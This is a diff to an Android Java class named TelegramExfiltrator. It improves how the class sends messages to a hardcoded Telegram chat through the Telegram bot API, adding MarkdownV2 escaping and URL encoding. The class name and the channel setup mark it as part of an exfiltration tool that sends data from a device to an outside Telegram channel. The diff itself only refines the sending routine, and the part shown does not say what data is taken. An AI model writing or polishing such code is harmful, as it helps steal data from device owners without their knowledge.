@@ -5,6 +5,7 @@ import java.io.FileInputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.net.URLEncoder;
 
 import android.util.Log;
 public class TelegramExfiltrator {
@@ -13,10 +14,30 @@ public class TelegramExfiltrator {
     private static final String CHAT_ID = "-1002606236199"; // ID du channel ou chat
 
     public static void sendTexte(String message) {
+        message = message.replace("_", "\\_")
+                .replace("*", "\\*")
+                .replace("[", "\\[")
+                .replace("]", "\\]")
+                .replace("(", "\\(")
+                .replace(")", "\\)")
+                .replace("~", "\\~")
+                .replace("`", "\\`")
+                .replace(">", "\\>")
+                .replace("#", "\\#")
+                .replace("+", "\\+")
+                .replace("-", "\\-")
+                .replace("=", "\\=")
+                .replace("|", "\\|")
+                .replace("{", "\\{")
+                .replace("}", "\\}")
+                .replace(".", "\\.")
+                .replace("!", "\\!")
+                .replace("\n", "  \n");
+
         String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage"
                 + "?chat_id=" + CHAT_ID
-                + "&text=" + message.replace(" ", "%20");
-
+                + "&text=" + URLEncoder.encode(message)
+                + "&parse_mode=MarkdownV2";
         new Thread(() -> {
             try {
                 URL obj = new URL(url);
